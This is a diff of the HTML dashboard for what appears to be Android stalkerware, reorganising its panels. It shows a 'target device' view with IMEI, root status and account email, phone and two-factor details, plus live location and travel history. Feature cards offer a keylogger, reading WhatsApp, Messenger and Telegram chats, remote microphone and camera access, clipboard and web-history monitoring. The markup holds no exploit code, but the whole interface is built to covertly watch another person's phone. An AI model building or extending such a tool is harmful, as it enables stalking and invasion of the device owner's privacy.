@@ -1,43 +1,100 @@
 
   <!-- Main Content -->
- <div class="main-content fade-in">
-
- <div class="index">
+ <div class="main-content fade-in ">
+  <div class="main-block" >
+  
+  <h1>Dashboard</h1>
+ <!-- <div class="index">
 
   <div class="header d-flex justify-content-between align-items-center margin">
-    <div>
+    <div class="header-dash-device-info" >
       <h5>Device: <span class="text-info">Oppo K1</span></h5>
       <h6>
         Status: <span id="deviceStatus" class="status-green online">Executing..</span> |
-        Battery: <span id="batteryLevel" class="text-warning"><i class="chargingOn fa-solid fa-bolt"></i>--%</span> |
+        Battery: <span id="batteryLevel" class="text-warning">--%</span> |
         Last Seen: <span id="lastSeen" class="status-green">Executing..</span> |
       </h6>
     </div>
   </div>
 
- </div>
+ </div> -->
 
    <div class="container dashboard">
-      <!-- Dashboard Section -->
-      <fieldset class="dash-fieldset">
-        <legend>Dashboard</legend>
+     
+    <!-- <fieldset class="dash-fieldset"> -->
+       <!-- <legend>Device Information</legend> -->
         <div class="row g-4">
-
-          <div class="col-md-4">
-            <div class="card fade-in">
-              <div class="card-title"><i class="fas fa-wifi"></i> Device Status</div>
-              <p>Monitor signal strength and connectivity.</p>
-              <button class="btn btn-outline-info btn-sm">Ping</button>
+          <div class="info-box" >
+           <div class="info" >
+           <div class="target-device-box-head" >
+            <p class="targetDevice-p">Target device info</p>
+            <div class="status" ></i><span class="on-off" id="deviceStatus" >Status...</span></div>
+           </div>
+                 <div class="target-device-info" ><span>Device Name :</span><span id="deviceName">...</span></div>
+                 <div class="target-device-info" ><span>Device model :</span><span id="deviceModel">...</span></div>
+                 <div class="target-device-info" ><span>Root :</span><span id="deviceRoot">...</span></div>
+                 <div class="target-device-info" ><span>IMEI Number :</span><span id="imeiNumber">...</span></div>
+                 <div class="percentage" >
+                   <div class="per batt" title="Battery" ><i class="fa-solid fa-battery-full"></i><i class="charging-on fa-solid fa-bolt"></i><span id="batteryLevel"></span></div>
+                   <div class="per gapp" title="Internet"><i class="fa-solid fa-signal dataSignal"></i><span id="dataEnable" ></span></div>
+                   <div class="per gapp" title="Wi-fi"><i class="fa-solid fa-wifi"></i><span>On</span></div>
+                     <!-- For Mute this i class <i class="fa-solid fa-volume-xmark"></i> -->
+                   <div class="per gapp" title=""><i class="fa-solid fa-volume-high"></i><span>On</span></div> 
+                   <div class="per gapp" title="Location"><i class="fa-solid fa-location-dot"></i><span>On</span></div>
+                 </div>
+                 <div class="lastSeen" > <span>Last Seen : </span> <span id="lastSeen" class="status-green">Executing..</span></div> 
             </div>
-          </div>
+           <div class="info">
+  <div class="target-device-box-head">
+    <p class="targetDevice-p">Account info</p>
+    <!-- <div class="status"><span class="on-off">Active</span></div> -->
+  </div>
 
-          <div class="col-md-4">
-            <div class="card fade-in">
-              <div class="card-title"><i class="fas fa-battery-three-quarters"></i> Battery Info</div>
-              <p>Check battery level and charging state.</p>
-              <button class="btn btn-outline-info btn-sm">Refresh</button>
-            </div>
-          </div>
+  <div class="target-device-info"><span>Account Name :</span><span id="accName">...</span></div>
+  <div class="target-device-info"><span>Email Address :</span><span id="accEmail">...</span></div>
+  <div class="target-device-info"><span>Phone Number :</span><span id="accPhone">...</span></div>
+  <div class="target-device-info"><span>Register Date :</span><span id="regisDate">...</span></div>
+  <div class="target-device-info"><span>Last Login :</span><span id="lastLogin">....</span></div>
+  <div class="target-device-info"><span>Two-Factor :</span><span id="twoFactor">...</span></div>
+</div>
+
+        </div>
+        </div>
+    <!-- </fieldset>       -->
+   
+      <!-- Dashboard Section -->
+     <div class="location-box">
+  <div class="location-inner-box">
+    <!-- LEFT: Location Info -->
+    <div class="location-info-left">
+      <div class="location-details">
+        <div class="location-header">
+          <p class="location-title">Location Info</p>
+          <i id="getLocationRefresh" title="refresh" class="fa-solid fa-arrows-rotate refresh"></i>
+        </div>
+        <div class="target-device-location" ><span>Latitude :</span><span id="latitude">...</span></div>
+        <div class="target-device-location" ><span>Longitude :</span><span id="longitude">...</span></div>
+        <div class="target-device-location"><span>Accuracy :</span><span id="accuracy">15m</span></div>
+        <div class="target-device-location"><span>Altitude :</span><span id="altitude">312m</span></div>
+        <div class="target-device-location"><span>Last Updated :</span><span id="locationUpdated">07 Aug 2025, 14:00</span></div>
+        <div class="target-device-location"><span>Address :</span><span id="address">Loading...</span></div>
+      </div>
+    </div>
+
+    <!-- RIGHT: Map -->
+    <div class="location-info-right">
+      <div class="map-container">
+        <iframe id="mapIframe" src="" allowfullscreen loading="lazy"></iframe>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+      <!--Middle feature-->
+      <fieldset class="dash-fieldset">
+        <legend>Logs</legend>
+        <div class="row g-4">
 
           <div class="col-md-4">
             <div class="card fade-in">
@@ -63,25 +120,14 @@
             </div>
           </div>
 
-          <div class="col-md-4">
-            <div class="card fade-in">
-              <div class="card-title"><i class="fas fa-chart-bar"></i> Statistics</div>
-              <p>Analyze usage and interaction stats.</p>
-              <button class="btn btn-outline-info btn-sm " id="statisticBtn">Open</button>
-            </div>
-          </div>
-
         </div>
-      </fieldset>
+      </fieldset >
 
-      <!--Middle feature-->
-      <fieldset class="dash-fieldset">
-        <legend>General</legend>
-        <div class="row g-4">
-
-          
-
-          <div class="col-md-4">
+<fieldset class="dash-fieldset">
+  <legend>Photos</legend>
+  <div class="row g-4">
+  
+       <div class="col-md-4">
             <div class="card fade-in">
               <div class="card-title"><i class="fas fa-image"></i> Gallery</div>
               <p>View and download images/videos.</p>
@@ -89,13 +135,6 @@
             </div>
           </div>
 
-           <div class="col-md-4">
-            <div class="card fade-in">
-              <div class="card-title"><i class="fas fa-keyboard"></i> Keylogger</div>
-              <p>Log and track keyboard input.</p>
-              <button class="btn btn-outline-danger btn-sm">View Logs</button>
-            </div>
-          </div>
 
            <div class="col-md-4">
             <div class="card fade-in">
@@ -113,85 +152,78 @@
             </div>
           </div>
 
-          <div class="col-md-4">
-            <div class="card fade-in">
-              <div class="card-title"><i class="fas fa-globe"></i> Site Web</div>
-              <p>Monitor web activity & history.</p>
-              <button class="btn btn-outline-info btn-sm">View</button>
-            </div>
-          </div>
-
-          <div class="col-md-4">
-      <div class="card fade-in">
-        <div class="card-title"><i class="fas fa-map-marked-alt"></i> Travel History</div>
-        <p>View previous travel routes of the device using location history.</p>
-        <button class="btn btn-outline-warning btn-sm">Show Routes</button>
       </div>
-    </div>
-
-        </div>
       </fieldset >
-
       <!-- Other Features Section -->
       <fieldset class="dash-fieldset">
-        <legend>Other Features</legend>
+        <legend>Apps</legend>
         <div class="row g-4">
 
-          <div class="col-md-4">
+          <!-- <div class="col-md-4">
             <div class="card fade-in">
               <div class="card-title"><i class="fas fa-history"></i> Clipboard History</div>
               <p>Track and view recent copied content on device.</p>
               <button class="btn btn-outline-light btn-sm">View Clipboard</button>
             </div>
-          </div>
+          </div> -->
          
-          <div class="col-md-4">
+          <!-- <div class="col-md-4">
             <div class="card fade-in">
               <div class="card-title"><i class="fas fa-bell-slash"></i> Do Not Disturb</div>
               <p>Remotely enable/disable DND or silent mode.</p>
               <button class="btn btn-outline-danger btn-sm">Toggle DND</button>
             </div>
-          </div>
+          </div> -->
+
+          <!-- <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-user-clock"></i> App Scheduler</div>
+                <p>Schedule to run or auto-close at set times.</p>
+                <button class="btn btn-outline-warning btn-sm">Set Schedule</button>
+              </div>
+          </div> -->
 
           <div class="col-md-4">
             <div class="card fade-in">
-              <div class="card-title"><i class="fas fa-user-clock"></i> App Scheduler</div>
-                <p>Schedule apps to run or auto-close at set times.</p>
-                <button class="btn btn-outline-warning btn-sm">Set Schedule</button>
-              </div>
+              <div class="card-title"><i class="fas fa-chart-bar"></i> Statistics</div>
+              <p>Analyze usage and interaction stats.</p>
+              <button class="btn btn-outline-info btn-sm " id="statisticBtn">Open</button>
+            </div>
           </div>
 
            <div class="col-md-4">
             <div class="card fade-in">
-              <div class="card-title"><i class="fas fa-folder-open"></i> Installed app</div>
-              <p>Browse all files on the device.</p>
-              <button class="btn btn-outline-secondary btn-sm" id="btnInstalledApps">Installed app</button>
+              <div class="card-title"><i class="fas fa-folder-open"></i> Installed app & App Scheduler</div>
+              <p>Watch installed app & schedule apps on the device.</p>
+              <button class="btn btn-outline-secondary btn-sm" id="btnInstalledApps">Installed app & App Scheduler</button>
             </div>
           </div>
 
-      </div>
-    </fieldset>
-
-      <!-- Advanced Intelligence Features -->
-<fieldset class="dash-fieldset">
-  <legend>Advanced Intelligence</legend>
-  <div class="row g-4">
-
-    <div class="col-md-4">
-      <div class="card fade-in">
-        <div class="card-title"><i class="fas fa-robot"></i> App Usage Monitor</div>
-        <p>Track which apps are being used in real-time and duration.</p>
-        <button class="btn btn-outline-info btn-sm">Monitor Apps</button>
-      </div>
-    </div>
-
-    <div class="col-md-4">
+          <div class="col-md-4">
       <div class="card fade-in">
         <div class="card-title"><i class="fas fa-envelope-open-text"></i> Instant Messaging</div>
         <p>Read WhatsApp, Messenger, Telegram (root/permission-based).</p>
         <button class="btn btn-outline-success btn-sm">Read Chats</button>
       </div>
     </div>
+
+
+      </div>
+    </fieldset>
+
+      <!-- Advanced Intelligence Features -->
+<fieldset class="dash-fieldset">
+  <legend>Location</legend>
+  <div class="row g-4">
+
+    <!-- <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-robot"></i> App Usage Monitor</div>
+        <p>Track which apps are being used in real-time and duration.</p>
+        <button class="btn btn-outline-info btn-sm">Monitor Apps</button>
+      </div>
+    </div> -->
+     
     
 
     <div class="col-md-4">
@@ -202,23 +234,6 @@
       </div>
     </div>
 
-    <div class="col-md-4">
-      <div class="card fade-in">
-        <div class="card-title"><i class="fas fa-bullhorn"></i> Alert Broadcast</div>
-        <p>Push voice/sound alerts to the device remotely.</p>
-        <button class="btn btn-outline-success btn-sm">Send Alert</button>
-      </div>
-    </div>
-
-    <div class="col-md-4">
-      <div class="card fade-in">
-        <div class="card-title"><i class="fas fa-shield-alt"></i> App Lock</div>
-        <p>Lock apps like gallery or messaging remotely.</p>
-        <button class="btn btn-outline-info btn-sm">Manage Locks</button>
-      </div>
-    </div>
-
-    
     
           <div class="col-md-4">
             <div class="card fade-in">
@@ -228,9 +243,25 @@
             </div>
           </div>
 
+           <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-map-marked-alt"></i> Travel History</div>
+        <p>View travel routes using location history.</p>
+        <button class="btn btn-outline-warning btn-sm">Show Routes</button>
+      </div>
+    </div>
+
     
 
-          <div class="col-md-4">
+         
+        </div>
+  </fieldset>
+
+  <fieldset class="dash-fieldset">
+    <legend>Advanced Intelligence</legend>
+    <div class="row g-4">
+
+     <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-microphone"></i> Microphone</div>
              <p>Stream or record live audio.</p>
@@ -238,13 +269,7 @@
             </div>
           </div>
 
-           <div class="col-md-4">
-            <div class="card fade-in">
-              <div class="card-title"><i class="fas fa-camera"></i> Camera Access</div>
-              <p>Capture images or start live video.</p>
-              <button class="btn btn-outline-danger btn-sm">Access Camera</button>
-            </div>
-          </div>
+           
 
           <div class="col-md-4">
             <div class="card fade-in">
@@ -262,6 +287,39 @@
             </div>
           </div>
 
+           <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-globe"></i> Site Web</div>
+              <p>Monitor web activity & history.</p>
+              <button class="btn btn-outline-info btn-sm">View</button>
+            </div>
+          </div>
+
+
+    <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-bullhorn"></i> Alert Broadcast</div>
+        <p>Push voice/sound alerts to the device remotely.</p>
+        <button class="btn btn-outline-success btn-sm">Send Alert</button>
+      </div>
+    </div>
+
+    <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-shield-alt"></i> App Lock</div>
+        <p>Lock apps like gallery or messaging remotely.</p>
+        <button class="btn btn-outline-info btn-sm">Manage Locks</button>
+      </div>
+    </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-camera"></i> Camera Access</div>
+              <p>Capture images or start live video.</p>
+              <button class="btn btn-outline-danger btn-sm">Access Camera</button>
+            </div>
+          </div>
+
           <div class="col-md-4">
             <div class="card fade-in">
               <div class="card-title"><i class="fa-solid fa-spider"></i> Spyder</div>
@@ -270,12 +328,20 @@
             </div>
           </div>
 
-        </div>
-
-  </div>
-</fieldset>
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-keyboard"></i> Keylogger</div>
+              <p>Log and track keyboard input.</p>
+              <button class="btn btn-outline-danger btn-sm">View Logs</button>
+            </div>
+          </div>
 
 
     </div>
-  
+  </fieldset >
+
+
+  </div>
+</div>
+</div> 
 
